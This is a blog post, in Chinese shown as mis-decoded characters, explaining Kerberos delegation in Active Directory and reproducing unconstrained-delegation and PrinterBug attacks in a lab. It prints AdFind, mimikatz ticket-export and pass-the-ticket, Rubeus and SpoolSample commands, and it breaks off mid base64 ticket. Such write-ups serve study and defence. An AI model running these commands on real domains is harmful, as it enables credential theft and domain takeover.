<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="ğ´_ğ‘Œğ‘¢">





<title>åŸŸå§”æ´¾æ”»å‡» | ğ“_ğš¼ğ“¾Í´ğ’” ğ“‘â„“ğ–”ğ“°</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 

<header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>ä¸»é¡µ</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">ä¸»é¡µ</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; èœå•</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">â–¶ï¸ å±•å¼€ç›®å½•</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">â–³ é¡¶éƒ¨</a>
        <a onclick="go_bottom()">â–½ åº•éƒ¨</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "â–¼ æ”¶èµ·ç›®å½•"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "â–¶ï¸ å±•å¼€ç›®å½•"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">åŸŸå§”æ´¾æ”»å‡»</h1>
            
                <div class="post-meta">
                    
                        <!--ä½œè€…:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">ğ´_ğ‘Œğ‘¢ </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--å‘å¸ƒæ—¶é—´:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-05-15&nbsp;&nbsp;21:50:04</a> &nbsp;
                        </span>
                    
                    
                    
                    <span id="/2022/05/15/22-0515-01/" class="leancloud-visitors view" data-flag-title="åŸŸå§”æ´¾æ”»å‡»">
                        <text class="post-meta-item-text">
                            <!--é˜…è¯»æ•°:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">åŠ è½½ä¸­</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><p>åŸŸå§”æ´¾æ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·çš„æƒé™åœ¨åŸŸå†…å±•å¼€æ´»åŠ¨ã€‚ç®€è¨€ä¹‹ï¼šå½“Aè®¿é—®æœåŠ¡Bæ—¶ï¼ŒæœåŠ¡Bæ‹¿ç€Aç”¨æˆ·çš„å‡­è¯å»è®¿é—®æœåŠ¡Cï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºå§”æ´¾ã€‚</p>
<p>æœåŠ¡è´¦å·ï¼ˆService Accountï¼‰ï¼ŒåŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼ŒæœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚MS SQL Serveråœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å·SqlServiceAccountï¼Œè¿™ç±»è´¦å·ä¸èƒ½ç”¨äºäº¤äº’å¼ç™»å½•ã€‚</p>
<img src="/2022/05/15/22-0515-01/image-20220523215242718.png" alt="image-20220523215242718" style="zoom:80%;">

<p>ä¸Šå›¾æ˜¯ç»å…¸çš„åº”ç”¨åœºæ™¯ã€‚ä¸€ä¸ªåŸŸå†…æ™®é€šç”¨æˆ·jacké€šè¿‡Kerberosåè®®è®¤è¯åˆ°å‰å°WEBæœåï¼Œå‰å°è¿è¡ŒWEBæœåŠ¡çš„æœåŠ¡è´¦å·websvcæ¨¡æ‹Ÿï¼ˆImpersonateï¼‰ç”¨æˆ·jackï¼Œä»¥Kerberosåè®®ç»§ç»­è®¤è¯åˆ°åå°æœåŠ¡å™¨ï¼Œä»è€Œåœ¨åå°æœåŠ¡å™¨ä¸­è·å–jackç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³åŸŸä¸­è·³æˆ–è€…å¤šè·³çš„Kerberosè®¤è¯ã€‚æŒ‰ç…§å›¾ä¸­çº¢è‰²å­—ä½“çš„æ•°å­—ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ul>
<li>åŸŸå†…ç”¨æˆ·jackä»¥Kerberosæ–¹å¼è®¤è¯åè®¿é—®WebæœåŠ¡å™¨ï¼›</li>
<li>WebæœåŠ¡ä»¥websvcæœåŠ¡è´¦å·è¿è¡Œï¼Œwebsvcå‘KDCå‘èµ·jackç”¨æˆ·çš„ç¥¨æ®ç”³è¯·ï¼›</li>
<li>KDCæ£€æŸ¥websvcç”¨æˆ·çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œåˆ™è¿”å›jackç”¨æˆ·çš„å¯è½¬å‘ç¥¨æ®TGTï¼›</li>
<li>websvcæ”¶åˆ°jackç”¨æˆ·TGTåï¼Œä½¿ç”¨è¯¥ç¥¨æ®å‘KDCç”³è¯·è®¿é—®æ–‡ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ®TGSï¼›</li>
<li>KDCæ£€æŸ¥websvcçš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œä¸”ç”³è¯·çš„æ–‡ä»¶æœåŠ¡åœ¨å…è®¸çš„åˆ—è¡¨æ¸…å•ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ªjackç”¨æˆ·è®¿é—®æ–‡ä»¶æœåŠ¡çš„æˆæƒç¥¨æ®TGSï¼›</li>
<li>websvcæ”¶åˆ°çš„jackç”¨æˆ·çš„æˆæƒç¥¨æ®TGSåï¼Œå¯è®¿é—®æ–‡ä»¶æœåŠ¡ï¼Œå®Œæˆå¤šè·³è®¤è¯ã€‚</li>
</ul>
<p>åŸŸå†…å§”æ´¾ä¸»è¦æœ‰3ç§åº”ç”¨æ–¹å¼ï¼š</p>
<ul>
<li><p>ä¸€æ˜¯éçº¦æŸæ€§å§”æ´¾ï¼ˆUnconstrained Delegationï¼‰ï¼ŒæœåŠ¡è´¦å·å¯ä»¥è·å–æŸç”¨æˆ·çš„TGTï¼Œä»è€ŒæœåŠ¡è´¦å·å¯ä½¿ç”¨è¯¥TGTï¼Œæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡ã€‚</p>
<p>ä¸¾ä¾‹è¯´æ˜ï¼Œå¦‚æœæŸä¸ªæœåŠ¡Açš„æœåŠ¡è´¦å·Bè¢«è®¾ç½®ä¸ºéçº¦æŸå§”æ´¾ï¼Œå½“ç”¨æˆ·Cé€šè¿‡Kerberosè®¤è¯è®¿é—®æœåŠ¡Aæ—¶ï¼ŒKDCä¼šæ£€æŸ¥æœåŠ¡è´¦å·Bçš„å±æ€§ï¼Œ<strong>å‘ç°æ˜¯éçº¦æŸæ€§å§”æ´¾æ—¶ï¼ŒKDCä¼šå°†ç”¨æˆ·Cçš„TGTæ”¾åœ¨TGSä¸­</strong>ï¼ˆæ­£å¸¸çš„kerberosåè®®ä¸­KDCä¸­å¹¶ä¸ä¼šåŒ…å«TGTï¼‰ï¼Œè¿™æ ·Båœ¨éªŒè¯TGSçš„åŒæ—¶è·å–äº†Aç”¨æˆ·çš„TGTï¼Œä»è€Œå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·Aè®¿é—®ä»»æ„æœåŠ¡ã€‚</p>
</li>
<li><p>äºŒæ˜¯çº¦æŸæ€§å§”æ´¾ï¼ˆConstrained Delegationï¼‰ï¼Œå³Kerberosçš„æ‰©å±•åè®®S4U2Proxyï¼ŒæœåŠ¡è´¦å·åªèƒ½è·å–æŸç”¨æˆ·çš„TGSï¼Œä»è€Œåªèƒ½æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ï¼›</p>
</li>
<li><p>ä¸‰æ˜¯èµ„æºå§”æ´¾ï¼ˆåè®®ä¼ é€’ï¼‰ï¼Œå³Kerberosçš„æ‰©å±•åè®®S4U2Selfï¼ŒæœåŠ¡è´¦å·é’ˆå¯¹æŸä¸€ä¸ªç‰¹å®šæœåŠ¡ï¼Œå¯æŸ¥è¯¢è·å–ä»»æ„ç”¨æˆ·çš„TGSï¼Œä»è€Œèƒ½æ¨¡æ‹Ÿä»»æ„ç”¨æˆ·è®¿é—®è¯¥ç‰¹å®šæœåŠ¡ã€‚</p>
</li>
<li><p>æ³¨æ„ï¼šåœ¨Windowsç³»ç»Ÿä¸­ï¼Œæ™®é€šç”¨æˆ·çš„å±æ€§ä¸­æ²¡æœ‰å§”æ´¾ï¼ˆDelegationï¼‰è¿™ä¸ªé€‰é¡¹å¡ï¼Œåªæœ‰æœåŠ¡è´¦å·ã€ä¸»æœºè´¦å·æ‰æœ‰ã€‚</p>
</li>
</ul>
<h1 id="éçº¦æŸæ€§å§”æ´¾"><a href="#éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾"></a>éçº¦æŸæ€§å§”æ´¾</h1><blockquote>
<p>ç¯å¢ƒå¦‚ä¸‹ï¼š</p>
</blockquote>
<img src="/2022/05/15/22-0515-01/image.png" alt="img" style="zoom:80%;">

<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>åœ¨åŸŸæ§12server-ad1ä¸Šè®¾ç½®åŸŸæˆå‘˜ä¸»æœº12server1ä¸ºå§”æ´¾</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-sZWS69ZgUmXJLsLJSAJPhB-0-ba8bb1f16f92c64945c1e02257a189de&image_process=resize,w_913.75" alt="img" style="zoom:80%;">

<p>åœ¨åŸŸæ§12server-ad1ä¸Šåˆ›å»ºæ™®é€šåŸŸç”¨æˆ·webï¼Œå¯†ç ä¸ºpass@123</p>
<p>ç„¶åæŠŠåŸŸç”¨æˆ·webè®¾ç½®ä¸ºæœåŠ¡è´¦å·</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-7x9zWoY71BZZ5fvdVPedzv-0-5503086fdc5c7d4158df8c2c1b358038&image_process=resize,w_783.75" alt="img" style="zoom:80%;">

<p>ç„¶åå¯¹webåŸŸç”¨æˆ·è®¾ç½®å§”æ´¾</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-iH4vDxeAPLfVcuB5QXmrg4-0-bc397695823f1f3b9c533e4a560cac18&image_process=resize,w_606.25" alt="img" style="zoom:80%;">

<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><ol>
<li><p>ç”¨åŸŸç”¨æˆ·testç™»é™†12server1ï¼Œç„¶ååˆ©ç”¨AdFind.exeå·¥å…·æ¥æŸ¥çœ‹é…ç½®äº†éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨è´¦æˆ·å’ŒæœåŠ¡è´¦æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image-16533145368605.png" alt="img" style="zoom:80%;">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„æœåŠ¡è´¦å·</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-mCDqfm5SEfMHjn1g3n83Ti-0-d0758620aa7702a52f2dab091d1244cd&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶ååœ¨åŸŸæ§ad1ä¸Šç”¨winrmè¿æ¥åŸŸå†…12server1ä¸»æœºï¼Œç”±äº12server1å¼€å¯äº†å§”æ´¾ï¼Œæ‰€ä»¥åœ¨kerberosåè®®ä¸­12server1æœ€ç»ˆä¼šæ”¶åˆ°åŸŸæ§ad1ä¸ŠåŸŸç®¡ç†å‘˜çš„TGTï¼Œå³åŸŸç®¡ç†å‘˜çš„TGTå°±ä¼šä¿å­˜åœ¨12server1çš„ä¸»æœºä¸Š</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-wKLEDLLYPBrk1mQLMvw4f1-0-e0f4df444fa47fa8e3410da6e4ff6e25&image_process=resize,w_888.75" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶åæˆ‘ä»¬å†æ¬¡ç™»é™†12server1ï¼Œç”¨mimikatzæŠŠæ‰€æœ‰çš„ç¥¨æ®å¯¼å‡ºï¼Œè¿™é‡Œç”¨mimikatzéœ€è¦é«˜æƒé™ï¼Œæ‰€ä»¥ç™»é™†12server1ä¸»æœºç”¨çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨mimikatzä¸­è¾“å…¥å¦‚ä¸‹å‘½ä»¤æŠŠç¥¨æ®å¯¼å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å‘ç°äº†åŸŸç®¡ç†å‘˜çš„é«˜æƒé™ç¥¨æ®ï¼š</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-6J1DjzoPM9JiR9hG3XL8kA-0-8f287ed426fc9c72e1ee16546781c06a&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶åå†æŠŠè¯¥ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt å‡­è¯åç§°</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-boztAFR9ShmKAXsKqGK4pa-0-dfe2c63160cba9688aa89368496f9cf8&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
</li>
<li><p>å¯¼å…¥åï¼Œ12server1æœºå™¨å°±å·²ç»æ‹¥æœ‰äº†åŸŸç®¡ç†å‘˜çš„æƒé™ï¼Œå¯ä»¥åœ¨12server1ä¸Šè®¿é—®åŸŸæ§</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-w26PifAimYDxBhpa5YnzqC-0-98ae740c61892776ca5215c901e3429a&image_process=resize,w_577.5" alt="img" style="zoom:80%;">

<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥è®¿é—®12server2æœºå™¨</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-iRfRAAu5y2JLwaJKww3dNw-0-893fe5fbfa0cceb4ae92bb7b94bba914&image_process=resize,w_566.25" alt="img" style="zoom:80%;"></li>
</ol>
<h2 id="éçº¦æŸæ€§å§”æ´¾-amp-PrinterBug-ï¼ˆSpoolerï¼‰"><a href="#éçº¦æŸæ€§å§”æ´¾-amp-PrinterBug-ï¼ˆSpoolerï¼‰" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾&amp;PrinterBug ï¼ˆSpoolerï¼‰"></a>éçº¦æŸæ€§å§”æ´¾&amp;PrinterBug ï¼ˆSpoolerï¼‰</h2><p>ä¸Šé¢ä»‹ç»äº†éçº¦æŸæ€§å§”æ´¾çš„ä¸€èˆ¬æ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•å¿…é¡»ç”±åŸŸç®¡ç†å‘˜è¿œç¨‹è¿æ¥åç•™ä¸‹é«˜æƒé™çš„TGTæ‰èƒ½åˆ©ç”¨ï¼Œå› æ­¤æ˜¾å¾—æœ‰äº›é¸¡è‚‹ã€‚ç„¶è€Œï¼Œåˆ©ç”¨PrinterBugå¯ä»¥ä¸ºéçº¦æŸæ€§å§”æ´¾æ”»å‡»åŠ©åŠ›ã€‚</p>
<p>Windows ä¸­çš„ MS-RPRNï¼ˆPrint System Remote Protocolï¼Œæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®ï¼‰ç”¨äºæ‰“å°å®¢æˆ·ç«¯å’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œæ”¯æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„åŒæ­¥æ‰“å°å’Œè”æœºæ“ä½œï¼ŒåŒ…æ‹¬æ‰“å°ä»»åŠ¡æ§åˆ¶ä»¥åŠæ‰“å°ç³»ç»Ÿç®¡ç†ã€‚</p>
<p>MS-RPRNåè®®ä¸­å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotification API å¯ä»¥åˆ›å»ºè¿œç¨‹ä¿®æ”¹é€šçŸ¥å¯¹è±¡ï¼Œç”¨äºç›‘æ§å¯¹æ‰“å°æœºå¯¹è±¡çš„ä¿®æ”¹ï¼Œå¹¶å‘æ‰“å°å®¢æˆ·ç«¯å‘é€ä¿®æ”¹é€šçŸ¥ã€‚ä»»ä½•å…·å¤‡åŸŸç”¨æˆ·æƒé™çš„æ”»å‡»è€…éƒ½å¯ä»¥æ»¥ç”¨è¯¥æ–¹æ³•æ¥å¼ºè¿«è¿è¡Œæ‰“å°æœåŠ¡ï¼ˆPrint Spoolerï¼‰çš„ä¸»æœºå‘æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡ä¸»æœºå‘èµ· Kerberos æˆ– NTLM è®¤è¯è¯·æ±‚ã€‚</p>
<p>ç»“åˆ PrinterBugï¼Œæ”»å‡»è€…å¯ä»¥å¼ºåˆ¶åŸŸæ§åˆ¶å™¨å‘é…ç½®äº†éçº¦æŸæ€§å§”æ´¾çš„ä¸»æœºå‘èµ· Kerberos èº«ä»½è®¤è¯ï¼Œå¹¶è·å–åŸŸæ§çš„é«˜æƒé™ TGTï¼Œè¯¥åˆ©ç”¨åœºæ™¯æ˜¯ <a target="_blank" rel="noopener" href="https://twitter.com/tifkin_">@tifkin_</a>ã€<a target="_blank" rel="noopener" href="http://twitter.com/enigma0x3">@enigma0x3</a> å’Œ <a target="_blank" rel="noopener" href="https://twitter.com/harmj0y">@harmj0y</a> åœ¨ 2018 å¹´çš„ DerbyCon å¤§ä¼šä¸Šæå‡ºçš„ï¼Œå¹¶å¼€å‘äº†ä¸€ä¸ªæ¦‚å¿µæ€§çš„å·¥å…· <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>ã€‚è¯¦æƒ…å¯ä»¥å‚è€ƒä»¥ä¸‹é“¾æ¥ä¸­çš„æ–‡ç« å’Œè§†é¢‘</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a></li>
<li><a target="_blank" rel="noopener" href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory</a></li>
</ul>
<img src="/2022/05/15/22-0515-01/image-165331511684815.png" alt="img" style="zoom:80%;">

<h3 id="ç¯å¢ƒé…ç½®-1"><a href="#ç¯å¢ƒé…ç½®-1" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><ul>
<li>é¦–å…ˆç›®æ ‡ä¸»æœºåŸŸæ§12server-ad1å¿…é¡»å¼€å¯SpooleræœåŠ¡ï¼ˆè¯¥æœåŠ¡é»˜è®¤æ˜¯å¼€å¯çš„ï¼‰</li>
<li>12server1åŸŸæˆå‘˜ä¸»æœºæ˜¯å¼€å¯å§”æ´¾çš„</li>
</ul>
<h3 id="å¯¹PrinterBugå’Œéçº¦æŸæ€§å§”æ´¾ç»“åˆå¤ç°"><a href="#å¯¹PrinterBugå’Œéçº¦æŸæ€§å§”æ´¾ç»“åˆå¤ç°" class="headerlink" title="å¯¹PrinterBugå’Œéçº¦æŸæ€§å§”æ´¾ç»“åˆå¤ç°"></a>å¯¹PrinterBugå’Œéçº¦æŸæ€§å§”æ´¾ç»“åˆå¤ç°</h3><ol>
<li><p>ç”¨testç”¨æˆ·ç™»é™†12server1ï¼Œåœ¨12server1åŸŸæˆå‘˜ä¸»æœºä¸Šå¯åŠ¨Rubeusç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:ad1$</span><br><span class="line"></span><br><span class="line"># /interval:1 è®¾ç½®ç›‘å¬é—´éš”1ç§’</span><br><span class="line"># /filteruser è®¾ç½®ç›‘å¬å¯¹è±¡ä¸ºæˆ‘ä»¬çš„åŸŸæ§ï¼Œæ³¨æ„åé¢æœ‰ä¸ª$ï¼Œå¦‚æœä¸è®¾ç½®ç›‘å¬å¯¹è±¡å°±ç›‘å¬æ‰€æœ‰çš„ TGT</span><br><span class="line"></span><br><span class="line">runas /profile /user:12server1\administrator cmd  #åœ¨cmdå‘½ä»¤è¡Œä¸‹åˆ‡æ¢è‡³ç®¡ç†å‘˜</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿è¡ŒæŠ¥é”™ï¼ŒåŸå› æ˜¯æƒé™ä¸å¤Ÿï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡cmdå‘½ä»¤è¡Œæ¥åˆ‡æ¢åˆ°12server1çš„æœ¬åœ°ç®¡ç†å‘˜ï¼Œç„¶åå†ç”¨Rubeusç›‘å¬</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-v8fEjF2E9YsUz3pZrJmoXp-0-0d59c24ac229b267d0690830c43332bd&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶ååœ¨12server1æœºå™¨ä¸Šï¼Œè®©åŸŸç”¨æˆ·teståˆ©ç”¨SpoolSample.exeå·¥å…·å‘åŸŸæ§12server-ad1çš„SpooleræœåŠ¡å‘é€è¯·æ±‚ï¼Œå¼ºåˆ¶åŸŸæ§å‘12server1æœºå™¨å‘èµ·èº«ä»½è®¤è¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe  ad1 12server1</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç›‘å¬åˆ°æ¥è‡ªåŸŸæ§çš„è®¤è¯è¯·æ±‚ï¼Œæ•æ‰åˆ°TGTç¥¨æ®äº†</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-eLHyHiPG89U1YyNKktxYpa-0-a82f4162e982eccf4e7167d2f40f022e&image_process=resize,w_913.75" alt="img" style="zoom:80%;">

<p>æ³¨æ„ï¼šä¸ºäº†æ–¹ä¾¿ï¼Œç”¨Rubeusè¿›è¡Œç›‘å¬çš„æ—¶å€™ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼Œè¿™æ ·ä¼šæŠŠç›‘å¬çš„å†…å®¹éƒ½æ”¾åˆ°hash.txtæ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿å¤åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:ad1$ &gt; c:\hash.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image-165331547664119.png" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶ååˆ©ç”¨powershellæŠŠbase64çš„TGTç¥¨æ®è½¬æ¢ä¸ºæ­£å¸¸çš„TGTç¥¨æ®ï¼Œæˆ‘ä»¬å‘ç°ç”Ÿæˆäº†ticket.kirbiç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;doIFCjCCBQagAwIBBaEDAgEWooIEEzCCBA9hggQLMIIEB6ADAgEFoQ4bDFJFRFRFQU0uQ0xVQqIhMB+gAwIBAqEYMBYbBmtyYnRn</span><br><span class="line">dBsMUkVEVEVBTS5DTFVCo4IDyzCCA8egAwIBEqEDAgECooIDuQSCA7VmQ3UG2RXvrndQofU5JkIqqD3HDAjE4r1Lzr7nX8ENC7ve</span><br><span 